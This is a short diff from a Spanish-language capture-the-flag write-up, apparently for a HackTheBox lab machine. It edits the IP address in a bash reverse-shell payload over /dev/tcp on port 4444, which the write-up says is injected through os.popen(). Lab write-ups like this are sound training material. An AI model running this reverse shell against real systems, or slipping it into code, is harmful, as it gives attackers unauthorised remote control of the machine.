@@ -178,7 +178,7 @@ http://internal-administration.goodgames.htb/
 *Payload de Netcat:*
 
 ```bash
-bash -c "bash -i >& /dev/tcp/10.10.14.5/4444 0>&1"
+bash -c "bash -i >& /dev/tcp/10.10.14.20/4444 0>&1"
 ```
 
 *Lo ingresamos dentro de la función os.popen()*
